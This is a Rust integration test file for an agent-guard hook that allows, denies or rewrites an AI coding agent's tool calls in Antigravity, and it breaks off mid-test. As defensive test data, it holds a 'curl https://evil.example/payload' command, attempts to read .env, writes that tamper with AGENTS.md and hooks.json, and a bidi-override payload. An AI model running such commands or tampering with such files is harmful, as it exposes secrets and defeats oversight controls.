#![forbid(unsafe_code)]

//! Comprehensive production-path integration tests for native Google Antigravity hook
//! protocol translation, lifecycle events, compiler output, and workspace-scoped
//! activation/deactivation (`crates/agent-guard/tests/antigravity_integration.rs`).
//!
//! Exercises actual `agent_guard::antigravity_adapter`, `agent_guard::operator`, and
//! the compiled `agent-guard` / `dotagent` binaries without recreating policy logic.

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};

use agent_guard::antigravity_adapter::{
    AntigravityEvent, EventEnforcementClass, MAX_ANTIGRAVITY_STDIN_BYTES,
    evaluate_antigravity_hook_bytes,
};
use agent_guard::json::JsonValue;
use agent_guard::operator::{
    detect_antigravity_workspace_dir, execute_antigravity_activate, execute_antigravity_deactivate,
    merge_antigravity_hooks_json,
};

static TEST_COUNTER: AtomicU64 = AtomicU64::new(0);

struct IsolatedWorkspace {
    base: PathBuf,
    repo_dir: PathBuf,
    state_dir: PathBuf,
}

impl IsolatedWorkspace {
    fn create(slug: &str) -> Self {
        let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
        let workspace_root = manifest_dir
            .parent()
            .and_then(Path::parent)
            .expect("workspace root");
        let seq = TEST_COUNTER.fetch_add(1, Ordering::Relaxed);
        let pid = std::process::id();
        let base = workspace_root
            .join("target")
            .join("test-workspaces")
            .join(format!("ag_integ_{slug}_{pid}_{seq}"));
        let _ = fs::remove_dir_all(&base);
        let repo_dir = base.join("repo");
        let state_dir = base.join("state");
        fs::create_dir_all(repo_dir.join(".git")).expect("create .git");
        fs::create_dir_all(&state_dir).expect("create state");
        fs::write(
            repo_dir.join("AGENTS.md"),
            "# AGENTS.md -- Test Root Authority\n",
        )
        .expect("write AGENTS.md");
        fs::create_dir_all(repo_dir.join("src")).expect("create src");
        fs::write(
            repo_dir.join("src/lib.rs"),
            "pub fn answer() -> u32 {\n    42\n}\n",
        )
        .expect("write src/lib.rs");
        Self {
            base,
            repo_dir,
            state_dir,
        }
    }

    fn ws_json(&self) -> String {
        JsonValue::Str(self.repo_dir.to_string_lossy().into_owned()).to_json_string()
    }
}

impl Drop for IsolatedWorkspace {
    fn drop(&mut self) {
        #[cfg(unix)]
        {
            let _ = Command::new("chmod")
                .args(["-R", "u+w"])
                .arg(&self.base)
                .status();
        }
        let _ = fs::remove_dir_all(&self.base);
    }
}

fn repo_root_of_dotagent() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(Path::parent)
        .expect("dotagent root")
        .to_path_buf()
}

fn agent_guard_bin_path() -> PathBuf {
    PathBuf::from(env!("CARGO_BIN_EXE_agent-guard"))
}

fn invoke_guard_cli(
    ws: &IsolatedWorkspace,
    args: &[&str],
    stdin_bytes: &[u8],
    extra_env: &[(&str, &str)],
) -> (i32, String, String) {
    let mut cmd = Command::new(agent_guard_bin_path());
    cmd.current_dir(&ws.repo_dir)
        .args(args)
        .env("AGENT_GUARD_STATE_DIR", &ws.state_dir)
        .env_remove("AGENT_GUARD_IN_SANDBOX")
        .env_remove("AGENT_GUARD_WORKER_LOCK")
        .env_remove("AGENT_GUARD_HOT_COORD")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    for &(k, v) in extra_env {
        cmd.env(k, v);
    }
    let mut child = cmd.spawn().expect("spawn agent-guard");
    if let Some(mut sin) = child.stdin.take() {
        let _ = sin.write_all(stdin_bytes);
    }
    let out = child.wait_with_output().expect("wait agent-guard");
    (
        out.status.code().unwrap_or(-1),
        String::from_utf8_lossy(&out.stdout).into_owned(),
        String::from_utf8_lossy(&out.stderr).into_owned(),
    )
}

/// Enforcing host simulator: invokes real `agent-guard antigravity-hook PreToolUse` subprocess
/// first and executes the side-effecting closure ONLY if exit_code == 0 and `decision == "allow"`.
fn mediated_host_execute<F>(
    ws: &IsolatedWorkspace,
    payload: &str,
    extra_env: &[(&str, &str)],
    side_effect: F,
) -> (i32, JsonValue, String, bool)
where
    F: FnOnce(Option<&JsonValue>),
{
    let (code, stdout, stderr) = invoke_guard_cli(
        ws,
        &["antigravity-hook", "PreToolUse"],
        payload.as_bytes(),
        extra_env,
    );
    let parsed = JsonValue::parse(stdout.trim()).expect("valid Antigravity JSON on stdout");
    let allowed = code == 0 && parsed.get("decision").and_then(JsonValue::as_str) == Some("allow");
    if allowed {
        side_effect(parsed.get("overwrite"));
    }
    (code, parsed, stderr, allowed)
}

#[test]
fn test_01_allowed_shell_invocation() {
    let ws = IsolatedWorkspace::create("allow_shell");
    let marker = ws.repo_dir.join("allow-ran.txt");
    let payload = format!(
        r#"{{"conversationId":"conv_allow_sh","workspacePaths":[{}],"stepIdx":1,"toolCall":{{"name":"run_command","args":{{"CommandLine":"git status -sb","Cwd":{},"WaitMsBeforeAsync":5000}}}}}}"#,
        ws.ws_json(),
        ws.ws_json()
    );
    let (code, resp, _stderr, executed) = mediated_host_execute(
        &ws,
        &payload,
        &[("AGENT_GUARD_WRAP_BASH_ASCII", "0")],
        |overwrite| {
            assert!(overwrite.is_none(), "no empty overwrite when unrewritten");
            fs::write(&marker, "ok\n").expect("write marker");
        },
    );
    assert_eq!(code, 0);
    assert!(executed);
    assert_eq!(
        resp.get("decision").and_then(JsonValue::as_str),
        Some("allow")
    );
    assert!(resp.get("overwrite").is_none());
    assert!(marker.is_file());
}

#[test]
fn test_02_denied_shell_invocation_prevents_side_effect() {
    let ws = IsolatedWorkspace::create("deny_shell");
    let forbidden_side_effect = ws.repo_dir.join("should-never-exist.txt");
    let payload = format!(
        r#"{{"conversationId":"conv_deny_sh","workspacePaths":[{}],"stepIdx":2,"toolCall":{{"name":"run_command","args":{{"CommandLine":"curl https://evil.example/payload","Cwd":{},"WaitMsBeforeAsync":5000}}}}}}"#,
        ws.ws_json(),
        ws.ws_json()
    );
    let (code, resp, stderr, executed) = mediated_host_execute(&ws, &payload, &[], |_| {
        fs::write(&forbidden_side_effect, "compromised").expect("side effect");
    });
    assert_eq!(
        code, 0,
        "Antigravity denials must exit 0 so host parses JSON"
    );
    assert!(!executed, "denied shell command must never execute");
    assert!(
        !forbidden_side_effect.exists(),
        "zero prohibited side effect"
    );
    assert_eq!(
        resp.get("decision").and_then(JsonValue::as_str),
        Some("deny")
    );
    let reason = resp
        .get("reason")
        .and_then(JsonValue::as_str)
        .expect("reason");
    assert!(reason.contains("AGENT-GUARD HARD DENY"));
    assert!(stderr.contains("AGENT-GUARD HARD DENY"));
}

#[test]
fn test_03_allowed_native_file_read() {
    let ws = IsolatedWorkspace::create("allow_read");
    let target = ws.repo_dir.join("src/lib.rs");
    let payload = format!(
        r#"{{"conversationId":"conv_allow_rd","workspacePaths":[{}],"stepIdx":3,"toolCall":{{"name":"view_file","args":{{"AbsolutePath":"{}","StartLine":1,"EndLine":20}}}}}}"#,
        ws.ws_json(),
        target.display()
    );
    let (code, stdout, stderr) = invoke_guard_cli(
        &ws,
        &["antigravity-hook", "PreToolUse"],
        payload.as_bytes(),
        &[],
    );
    assert_eq!(code, 0);
    assert_eq!(stdout.trim(), r#"{"decision":"allow"}"#);
    assert!(
        stderr.contains("SPOTLIGHT_BOUNDARY_"),
        "spotlighting advisory stays on stderr, never polluting stdout JSON"
    );
}

#[test]
fn test_04_denied_native_file_read_prevents_secret_and_shadow_authority_access() {
    let ws = IsolatedWorkspace::create("deny_read");
    fs::write(ws.repo_dir.join(".env"), "SECRET_KEY=do_not_read\n").expect("write .env");
    fs::write(ws.repo_dir.join("CLAUDE.md"), "shadow instructions\n").expect("write CLAUDE.md");

    for blocked_rel in [".env", "CLAUDE.md"] {
        let blocked_path = ws.repo_dir.join(blocked_rel);
        let mut read_occurred = false;
        let payload = format!(
            r#"{{"conversationId":"conv_deny_rd_{blocked_rel}","workspacePaths":[{}],"stepIdx":1,"toolCall":{{"name":"view_file","args":{{"AbsolutePath":"{}"}}}}}}"#,
            ws.ws_json(),
            blocked_path.display()
        );
        let (code, resp, _stderr, executed) = mediated_host_execute(&ws, &payload, &[], |_| {
            read_occurred = true;
        });
        assert_eq!(code, 0);
        assert!(!executed && !read_occurred);
        assert_eq!(
            resp.get("decision").and_then(JsonValue::as_str),
            Some("deny")
        );
    }
}

#[test]
fn test_05_denied_native_file_write_protects_control_plane_and_secrets() {
    let ws = IsolatedWorkspace::create("deny_write");
    for rel_target in ["AGENTS.md", ".agents/hooks.json", ".env"] {
        let target_path = ws.repo_dir.join(rel_target);
        let orig_agents =
            fs::read_to_string(ws.repo_dir.join("AGENTS.md")).expect("read AGENTS.md");
        let payload = format!(
            r#"{{"conversationId":"conv_deny_wr","workspacePaths":[{}],"stepIdx":4,"toolCall":{{"name":"write_to_file","args":{{"TargetFile":"{}","Overwrite":true,"CodeContent":"tampered\n","Description":"attempt"}}}}}}"#,
            ws.ws_json(),
            target_path.display()
        );
        let (code, resp, _stderr, executed) = mediated_host_execute(&ws, &payload, &[], |_| {
            fs::write(&target_path, "tampered\n").expect("write");
        });
        assert_eq!(code, 0);
        assert!(!executed);
        assert_eq!(
            resp.get("decision").and_then(JsonValue::as_str),
            Some("deny")
        );
        assert_eq!(
            fs::read_to_string(ws.repo_dir.join("AGENTS.md")).expect("AGENTS.md intact"),
            orig_agents
        );
        if rel_target != "AGENTS.md" {
            assert!(!target_path.exists());
        }
    }
}

#[test]
fn test_06_authorized_command_and_pagination_rewriting() {
    let ws = IsolatedWorkspace::create("rewrite");
    // 6a: Shell wrapping populates only changed `CommandLine` key in `overwrite`
    let sh_payload = format!(
        r#"{{"conversationId":"conv_rw_1","workspacePaths":[{}],"stepIdx":1,"toolCall":{{"name":"run_command","args":{{"CommandLine":"echo safe","Cwd":{},"WaitMsBeforeAsync":5000}}}}}}"#,
        ws.ws_json(),
        ws.ws_json()
    );
    let (code, stdout, _) = invoke_guard_cli(
        &ws,
        &["antigravity-hook", "PreToolUse"],
        sh_payload.as_bytes(),
        &[("AGENT_GUARD_WRAP_BASH_ASCII", "1")],
    );
    assert_eq!(code, 0);
    let sh_json = JsonValue::parse(stdout.trim()).expect("parse overwrite JSON");
    assert_eq!(
        sh_json.get("decision").and_then(JsonValue::as_str),
        Some("allow")
    );
    let ow = sh_json.get("overwrite").expect("overwrite present");
    let ow_entries = ow.as_object().expect("overwrite object");
    assert_eq!(
        ow_entries.len(),
        1,
        "only changed top-level key in overwrite"
    );
    let rewritten_cmd = ow
        .get("CommandLine")
        .and_then(JsonValue::as_str)
        .expect("CommandLine string");
    assert!(rewritten_cmd.contains("exec-sandbox --sanitize-stream"));

    // 6b: Unsliced >150-line view_file clamps to StartLine=1, EndLine=150 via `overwrite`
    let mut big_content = String::new();
    for line_no in 1..=320 {
        big_content.push_str(&format!("pub const L_{line_no}: usize = {line_no};\n"));
    }
    let big_file = ws.repo_dir.join("src/large.rs");
    fs::write(&big_file, big_content).expect("write large.rs");
    let rd_payload = format!(
        r#"{{"conversationId":"conv_rw_2","workspacePaths":[{}],"stepIdx":2,"toolCall":{{"name":"view_file","args":{{"AbsolutePath":"{}"}}}}}}"#,
        ws.ws_json(),
        big_file.display()
    );
    let (code2, stdout2, _) = invoke_guard_cli(
        &ws,
        &["antigravity-hook", "PreToolUse"],
        rd_payload.as_bytes(),
        &[],
    );
    assert_eq!(code2, 0);
    let rd_json = JsonValue::parse(stdout2.trim()).expect("parse read overwrite");
    assert_eq!(
        rd_json.get("decision").and_then(JsonValue::as_str),
        Some("allow")
    );
    let rd_ow = rd_json.get("overwrite").expect("pagination overwrite");
    assert_eq!(rd_ow.get("StartLine").and_then(JsonValue::as_u64), Some(1));
    assert_eq!(rd_ow.get("EndLine").and_then(JsonValue::as_u64), Some(150));
}

#[test]
fn test_07_unknown_tool_name_denied_fail_closed() {
    let ws = IsolatedWorkspace::create("unknown_tool");
    let payload = format!(
        r#"{{"conversationId":"conv_unk","workspacePaths":[{}],"stepIdx":1,"toolCall":{{"name":"mystery_cloud_mutator","args":{{"target":"prod"}}}}}}"#,
        ws.ws_json()
    );
    let out = evaluate_antigravity_hook_bytes("PreToolUse", payload.as_bytes(), &ws.repo_dir, None);
    assert_eq!(out.exit_code, 0);
    let parsed = JsonValue::parse(out.stdout_json.as_deref().expect("stdout")).expect("json");
    assert_eq!(
        parsed.get("decision").and_then(JsonValue::as_str),
        Some("deny")
    );
    assert!(
        parsed
            .get("reason")
            .and_then(JsonValue::as_str)
            .expect("reason")
            .contains("UNRECOGNIZED_TOOL_BLOCKED")
    );
}

#[test]
fn test_08_malformed_and_duplicate_key_json_rejected() {
    let ws = IsolatedWorkspace::create("malformed_json");
    for bad in [
        "",
        "   ",
        "{not-valid-json",
        "[\"array_root\"]",
        &format!(
            r#"{{"conversationId":"dup1","conversationId":"dup2","workspacePaths":[{}],"toolCall":{{"name":"list_dir","args":{{}}}}}}"#,
            ws.ws_json()
        ),
    ] {
        let out = evaluate_antigravity_hook_bytes("PreToolUse", bad.as_bytes(), &ws.repo_dir, None);
        assert_eq!(out.exit_code, 0);
        let parsed = JsonValue::parse(out.stdout_json.as_deref().expect("stdout")).expect("json");
        assert_eq!(
            parsed.get("decision").and_then(JsonValue::as_str),
            Some("deny")
        );
        assert!(
            parsed
                .get("reason")
                .and_then(JsonValue::as_str)
                .expect("reason")
                .contains("INVALID_HOOK_JSON")
        );
    }
}

#[test]
fn test_09_missing_or_invalid_tool_call_rejected() {
    let ws = IsolatedWorkspace::create("missing_toolcall");
    let cases = [
        (
            format!(
                r#"{{"conversationId":"c1","workspacePaths":[{}],"stepIdx":1}}"#,
                ws.ws_json()
            ),
            "MISSING_TOOL_CALL",
        ),
        (
            format!(
                r#"{{"conversationId":"c2","workspacePaths":[{}],"toolCall":"not_obj"}}"#,
                ws.ws_json()
            ),
            "MISSING_TOOL_CALL",
        ),
        (
            format!(
                r#"{{"conversationId":"c3","workspacePaths":[{}],"toolCall":{{"args":{{}}}}}}"#,
                ws.ws_json()
            ),
            "MISSING_TOOL_NAME",
        ),
        (
            format!(
                r#"{{"conversationId":"c4","workspacePaths":[{}],"toolCall":{{"name":"view_file","args":"stringified"}}}}"#,
                ws.ws_json()
            ),
            "INVALID_TOOL_ARGS",
        ),
    ];
    for (raw, expected_code) in cases {
        let out = evaluate_antigravity_hook_bytes("PreToolUse", raw.as_bytes(), &ws.repo_dir, None);
        assert_eq!(out.exit_code, 0);
        let parsed = JsonValue::parse(out.stdout_json.as_deref().expect("stdout")).expect("json");
        assert_eq!(
            parsed.get("decision").and_then(JsonValue::as_str),
            Some("deny")
        );
        let reason = parsed
            .get("reason")
            .and_then(JsonValue::as_str)
            .expect("reason");
        assert!(
            reason.contains(expected_code),
            "expected {expected_code} in '{reason}'"
        );
    }
}

#[test]
fn test_10_missing_or_ambiguous_workspace_identity_rejected() {
    let ws_a = IsolatedWorkspace::create("ws_id_a");
    let ws_b = IsolatedWorkspace::create("ws_id_b");

    // Missing workspacePaths
    let p_missing = r#"{"conversationId":"c_ws1","toolCall":{"name":"list_dir","args":{}}}"#;
    let out1 =
        evaluate_antigravity_hook_bytes("PreToolUse", p_missing.as_bytes(), &ws_a.repo_dir, None);
    let j1 = JsonValue::parse(out1.stdout_json.as_deref().expect("stdout")).expect("json");
    assert!(
        j1.get("reason")
            .and_then(JsonValue::as_str)
            .expect("reason")
            .contains("MISSING_WORKSPACE_IDENTITY")
    );

    // Empty workspacePaths
    let p_empty = r#"{"conversationId":"c_ws2","workspacePaths":[],"toolCall":{"name":"list_dir","args":{}}}"#;
    let out2 =
        evaluate_antigravity_hook_bytes("PreToolUse", p_empty.as_bytes(), &ws_a.repo_dir, None);
    let j2 = JsonValue::parse(out2.stdout_json.as_deref().expect("stdout")).expect("json");
    assert!(
        j2.get("reason")
            .and_then(JsonValue::as_str)
            .expect("reason")
            .contains("MISSING_WORKSPACE_IDENTITY")
    );

    // Conflicting OS CWD (ws_b) vs claimed single workspacePaths ([ws_a])
    let p_conflict = format!(
        r#"{{"conversationId":"c_ws3","workspacePaths":[{}],"toolCall":{{"name":"view_file","args":{{"AbsolutePath":"{}/src/lib.rs"}}}}}}"#,
        ws_a.ws_json(),
        ws_a.repo_dir.display()
    );
    let out3 =
        evaluate_antigravity_hook_bytes("PreToolUse", p_conflict.as_bytes(), &ws_b.repo_dir, None);
    let j3 = JsonValue::parse(out3.stdout_json.as_deref().expect("stdout")).expect("json");
    assert_eq!(j3.get("decision").and_then(JsonValue::as_str), Some("deny"));
    assert!(
        j3.get("reason")
            .and_then(JsonValue::as_str)
            .expect("reason")
            .contains("AMBIGUOUS_WORKSPACE_IDENTITY")
    );
}

#[test]
fn test_11_multiple_workspaces_disambiguation_and_cross_repo_isolation() {
    let ws_a = IsolatedWorkspace::create("multi_a");
    let ws_b = IsolatedWorkspace::create("multi_b");
    let parent_dir = ws_a.base.parent().expect("parent").to_path_buf();

    // 11a: Unpinned multi-repo payload from neutral parent directory is rejected as ambiguous
    let multi_payload = format!(
        r#"{{"conversationId":"c_multi_1","workspacePaths":[{},{}],"toolCall":{{"name":"view_file","args":{{"AbsolutePath":"{}/src/lib.rs"}}}}}}"#,
        ws_a.ws_json(),
        ws_b.ws_json(),
        ws_a.repo_dir.display()
    );
    let ambig =
        evaluate_antigravity_hook_bytes("PreToolUse", multi_payload.as_bytes(), &parent_dir, None);
    let ambig_j = JsonValue::parse(ambig.stdout_json.as_deref().expect("stdout")).expect("json");
    assert_eq!(
        ambig_j.get("decision").and_then(JsonValue::as_str),
        Some("deny")
    );
    assert!(
        ambig_j
            .get("reason")
            .and_then(JsonValue::as_str)
            .expect("reason")
            .contains("AMBIGUOUS_WORKSPACE_IDENTITY")
    );

    // 11b: With pinned `--workspace ws_a`, reading ws_a succeeds while reading sibling ws_b is denied!
    let allow_a = evaluate_antigravity_hook_bytes(
        "PreToolUse",
        multi_payload.as_bytes(),
        &parent_dir,
        Some(&ws_a.repo_dir),
    );
    let allow_j = JsonValue::parse(allow_a.stdout_json.as_deref().expect("stdout")).expect("json");
    assert_eq!(
        allow_j.get("decision").and_then(JsonValue::as_str),
        Some("allow")
    );

    let cross_repo_payload = format!(
        r#"{{"conversationId":"c_multi_1","workspacePaths":[{},{}],"toolCall":{{"name":"view_file","args":{{"AbsolutePath":"{}/src/lib.rs"}}}}}}"#,
        ws_a.ws_json(),
        ws_b.ws_json(),
        ws_b.repo_dir.display()
    );
    let deny_b = evaluate_antigravity_hook_bytes(
        "PreToolUse",
        cross_repo_payload.as_bytes(),
        &parent_dir,
        Some(&ws_a.repo_dir),
    );
    let deny_j = JsonValue::parse(deny_b.stdout_json.as_deref().expect("stdout")).expect("json");
    assert_eq!(
        deny_j.get("decision").and_then(JsonValue::as_str),
        Some("deny")
    );
    assert!(
        deny_j
            .get("reason")
            .and_then(JsonValue::as_str)
            .expect("reason")
            .contains("REPO_BOUNDARY_ESCAPE")
    );
}

#[test]
fn test_12_oversized_input_denied_with_exit_zero() {
    let ws = IsolatedWorkspace::create("oversized");
    let filler = "a".repeat(MAX_ANTIGRAVITY_STDIN_BYTES + 128);
    let huge = format!(
        r#"{{"conversationId":"c_big","workspacePaths":[{}],"lastUserInput":"{filler}","toolCall":{{"name":"list_dir","args":{{}}}}}}"#,
        ws.ws_json()
    );
    let (code, stdout, stderr) = invoke_guard_cli(
        &ws,
        &["antigravity-hook", "PreToolUse"],
        huge.as_bytes(),
        &[],
    );
    assert_eq!(code, 0);
    let parsed = JsonValue::parse(stdout.trim()).expect("json");
    assert_eq!(
        parsed.get("decision").and_then(JsonValue::as_str),
        Some("deny")
    );
    assert!(
        parsed
            .get("reason")
            .and_then(JsonValue::as_str)
            .expect("reason")
            .contains("HOOK_INPUT_OVERFLOW")
    );
    assert!(stderr.contains("HOOK_INPUT_OVERFLOW"));
}

#[test]
fn test_13_unexpected_unicode_and_control_characters_rejected() {
    let ws = IsolatedWorkspace::create("unicode_ctrl");
    let target = ws.repo_dir.join("src/new_file.rs");

    // Trojan Source Bidi override U+202E in write_to_file CodeContent
    let bidi_write = format!(
        "{{\"conversationId\":\"c_uni_1\",\"workspacePaths\":[{}],\"toolCall\":{{\"name\":\"write_to_file\",\"args\":{{\"TargetFile\":\"{}\",\"Overwrite\":true,\"CodeContent\":\"// \\u202e evil\\n\",\"Description\":\"bidi\"}}}}}}",
        ws.ws_json(),
        target.display()
    );
    let out1 =
        evaluate_antigravity_hook_bytes("PreToolUse", bidi_write.as_bytes(), &ws.repo_dir, None);
    assert_eq!(out1.exit_code, 0);
    let j1 = JsonValue::parse(out1.stdout_json.as_deref().expect("stdout")).expect("json");
    assert_eq!(j1.get("decision").and_then(JsonValue::as_str), Some("deny"));

    // Control character in conversationId
    let ctrl_id = format!(
        "{{\"conversationId\":\"bad\\u0007id\",\"workspacePaths\":[{}],\"toolCall\":{{\"name\":\"list_dir\",\"args\":{{}}}}}}",
        ws.ws_json()
    );
    let out2 =
        evaluate_antigravity_hook_bytes("PreToolUse", ctrl_id.as_bytes(), &ws.repo_dir, None);
    let j2 = JsonValue::parse(out2.stdout_json.as_deref().expect("stdout")).expect("json");
    assert_eq!(j2.get("decision").and_then(JsonValue::as_str), Some("deny"));
    assert!(
        j2.get("reason")
            .and_then(JsonValue::as_str)
            .expect("reason")
            .contains("PATH_CONTROL_INJECTION")
    );
}

#[test]
fn test_14_lifecycle_events_and_unsupported_event_rejection() {
    let ws = IsolatedWorkspace::create("lifecycle");

    // Unsupported lifecycle event fails closed with exit 2 and empty stdout
    let bad = evaluate_antigravity_hook_bytes("BeforeTool", b"{}", &ws.repo_dir, None);
    assert_eq!(bad.exit_code, 2);
    assert!(bad.stdout_json.is_none());
    assert!(
        bad.stderr_diagnostic
            .as_deref()
            .expect("stderr")
            .contains("UNSUPPORTED_LIFECYCLE_EVENT")
    );

    // Verify accurate enforcement classifications
    assert_eq!(
        AntigravityEvent::SessionStart.enforcement_class(),
        EventEnforcementClass::SessionBootstrap
    );
    assert_eq!(
        AntigravityEvent::PreInvocation.enforcement_class(),
        EventEnforcementClass::ModelGate
    );
    assert_eq!(
        AntigravityEvent::PreToolUse.enforcement_class(),
        EventEnforcementClass::ToolGate
    );
    assert_eq!(
        AntigravityEvent::PostToolUse.enforcement_class(),
        EventEnforcementClass::ObservationalStateUpdate
    );
    assert_eq!(
        AntigravityEvent::PostInvocation.enforcement_class(),
        EventEnforcementClass::LoopControlGate
    );
    assert_eq!(
        AntigravityEvent::Stop.enforcement_class(),
        EventEnforcementClass::StopAuditGate
    );

    // SessionStart -> PreInvocation -> PostToolUse (secret write trips circuit breaker) -> PostInvocation terminates -> Stop allows termination without looping
    let start_p = format!(
        r#"{{"conversationId":"conv_lc_1","workspacePaths":[{}],"modelName":"gemini-4-neon"}}"#,
        ws.ws_json()
    );
    let (c_start, out_start, _) = invoke_guard_cli(
        &ws,
        &["antigravity-hook", "SessionStart"],
        start_p.as_bytes(),
        &[],
    );
    assert_eq!(c_start, 0);
    assert!(out_start.contains("injectSteps"));

    let pre_inv = format!(
        r#"{{"conversationId":"conv_lc_1","workspacePaths":[{}],"invocationNum":0,"initialNumSteps":1,"lastUserInput":"Inspect src/lib.rs"}}"#,
        ws.ws_json()
    );
    let (c_pre, out_pre, _) = invoke_guard_cli(
        &ws,
        &["antigravity-hook", "PreInvocation"],
        pre_inv.as_bytes(),
        &[],
    );
    assert_eq!(c_pre, 0);
    assert_eq!(out_pre.trim(), "{}");

    // Simulate file written with accidental secret; PostToolUse emits `{}` (observational) and trips circuit breaker
    let leaked_file = ws.repo_dir.join("src/leaked.rs");
    fs::write(
        &leaked_file,
        "pub const TOK: &str = \"ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ123456\";\n",
    )
    .expect("write leaked.rs");
    let post_tool = format!(
        r#"{{"conversationId":"conv_lc_1","workspacePaths":[{}],"stepIdx":1,"error":"","toolCall":{{"name":"write_to_file","args":{{"TargetFile":"{}"}}}}}}"#,
        ws.ws_json(),
        leaked_file.display()
    );
    let (c_post_t, out_post_t, err_post_t) = invoke_guard_cli(
        &ws,
        &["antigravity-hook", "PostToolUse"],
        post_tool.as_bytes(),
        &[],
    );
    assert_eq!(c_post_t, 0);
    assert_eq!(out_post_t.trim(), "{}");
    assert!(err_post_t.contains("HARDCODED_SECRET_LITERAL"));

    // Next PostInvocation enforces termination immediately!
    let post_inv = format!(
        r#"{{"conversationId":"conv_lc_1","workspacePaths":[{}],"invocationNum":1,"initialNumSteps":3}}"#,
        ws.ws_json()
    );
    let (c_post_i, out_post_i, _) = invoke_guard_cli(
        &ws,
        &["antigravity-hook", "PostInvocation"],
        post_inv.as_bytes(),
        &[],
    );
    assert_eq!(c_post_i, 0);
    let post_i_json = JsonValue::parse(out_post_i.trim()).expect("post_inv json");
    assert_eq!(
        post_i_json
            .get("terminationBehavior")
            .and_then(JsonValue::as_str),
        Some("terminate")
    );

    // Stop on halted session allows termination cleanly (never infinite-loops with "continue")
    let stop_p = format!(
        r#"{{"conversationId":"conv_lc_1","workspacePaths":[{}],"executionNum":1,"terminationReason":"model_stop","fullyIdle":true}}"#,
        ws.ws_json()
    );
    let (c_stop, out_stop, _) =
        invoke_guard_cli(&ws, &["antigravity-hook", "Stop"], stop_p.as_bytes(), &[]);
    assert_eq!(c_stop, 0);
    let stop_json = JsonValue::parse(out_stop.trim()).expect("stop json");
    assert_eq!(
        stop_json.get("decision").and_then(JsonValue::as_str),
        Some("allow")
    );
}

#[test]
fn test_15_and_16_exit_codes_clean_stdout_and_gemini_cli_compatibility() {
    let ws = IsolatedWorkspace::create("gemini_compat");

    // Legacy Gemini CLI `pre-tool` format continues returning `hookSpecificOutput` on allow and exit 2 on deny
    let gemini_allow = format!(
        r#"{{"session_id":"gem_1","hook_event_name":"BeforeTool","tool_name":"view_file","tool_input":{{"AbsolutePath":"{}/src/lib.rs","StartLine":1,"EndLine":10}}}}"#,
        ws.repo_dir.display()
    );
    let (g_allow_code, g_allow_out, _) =
        invoke_guard_cli(&ws, &["pre-tool"], gemini_allow.as_bytes(), &[]);
    assert_eq!(g_allow_code, 0);
    let g_allow_json = JsonValue::parse(g_allow_out.trim()).expect("gemini allow json");
    assert!(g_allow_json.get("hookSpecificOutput").is_some());

    let gemini_deny = format!(
        r#"{{"session_id":"gem_1","hook_event_name":"BeforeTool","tool_name":"view_file","tool_input":{{"AbsolutePath":"{}/.env"}}}}"#,
        ws.repo_dir.display()
    );
    let (g_deny_code, g_deny_out, _) =
        invoke_guard_cli(&ws, &["pre-tool"], gemini_deny.as_bytes(), &[]);
    assert_eq!(g_deny_code, 2, "Gemini/Claude CLI path preserves exit 2");
    let g_deny_json = JsonValue::parse(g_deny_out.trim()).expect("gemini deny json");
    assert_eq!(
        g_deny_json.get("decision").and_then(JsonValue::as_str),
        Some("block")
    );
}

#[test]
fn test_17_and_18_workspace_activation_reversibility_merge_and_permissions() {
    let ws = IsolatedWorkspace::create("activate_merge");
    let dotagent_root = repo_root_of_dotagent();
    let bin_dir = agent_guard_bin_path()
        .parent()
        .expect("bin parent")
        .to_path_buf();

    // Seed fake HOME with pre-existing GEMINI.md and .gitconfig to prove workspace-scoped activation NEVER touches them!
    let fake_home = ws.base.join("fake_home");
    fs::create_dir_all(fake_home.join(".gemini")).expect("create .gemini");
    fs::write(
        fake_home.join(".gemini/GEMINI.md"),
        "USER_CUSTOM_GEMINI_MD\n",
    )
    .expect("write GEMINI.md");
    fs::write(fake_home.join(".gitconfig"), "[user]\n\tname = Custom\n").expect("write .gitconfig");

    // Pre-existing `.agents/hooks.json` with custom user hook and strict 0600 permissions + unrelated `.agents/notes.txt`
    let ag_dir = ws.repo_dir.join(".agents");
    fs::create_dir_all(&ag_dir).expect("create .agents");
    let original_hooks = "{\n  \"user-linter\": {\n    \"PostToolUse\": [\n      {\n        \"matcher\": \"write_to_file\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"./lint.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n";
    let hooks_path = ag_dir.join("hooks.json");
    fs::write(&hooks_path, original_hooks).expect("write pre-existing hooks.json");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&hooks_path, fs::Permissions::from_mode(0o600)).expect("chmod 0600");
    }
    fs::write(ag_dir.join("notes.txt"), "keep me\n").expect("write notes.txt");

    // Deterministic dry-run makes zero filesystem mutations
    let dry_1 =
        execute_antigravity_activate(&bin_dir, &dotagent_root, &ws.repo_dir, true).expect("dry 1");
    let dry_2 =
        execute_antigravity_activate(&bin_dir, &dotagent_root, &ws.repo_dir, true).expect("dry 2");
    assert_eq!(dry_1, dry_2, "dry-run output must be deterministic");
    assert!(!ag_dir.join("hooks.json.dotagent.bak").exists());
    assert_eq!(
        fs::read_to_string(&hooks_path).expect("unchanged on dry-run"),
        original_hooks
    );

    // Real workspace-scoped CLI activation
    let (act_code, _act_out, act_err) = invoke_guard_cli(
        &ws,
        &[
            "activate",
            "--antigravity",
            "--dotagent-root",
            &dotagent_root.to_string_lossy(),
            "--bin-dir",
            &bin_dir.to_string_lossy(),
            "--workspace",
            &ws.repo_dir.to_string_lossy(),
        ],
        b"",
        &[("HOME", &fake_home.to_string_lossy())],
    );
    assert_eq!(act_code, 0, "activate failed: {act_err}");

    // Global files untouched!
    assert_eq!(
        fs::read_to_string(fake_home.join(".gemini/GEMINI.md")).expect("GEMINI.md"),
        "USER_CUSTOM_GEMINI_MD\n"
    );
    assert_eq!(
        fs::read_to_string(fake_home.join(".gitconfig")).expect(".gitconfig"),
        "[user]\n\tname = Custom\n"
    );

    // Merged hooks.json preserves `user-linter`, adds pinned `dotagent-guard`, backs up `.dotagent.bak`, preserves 0600!
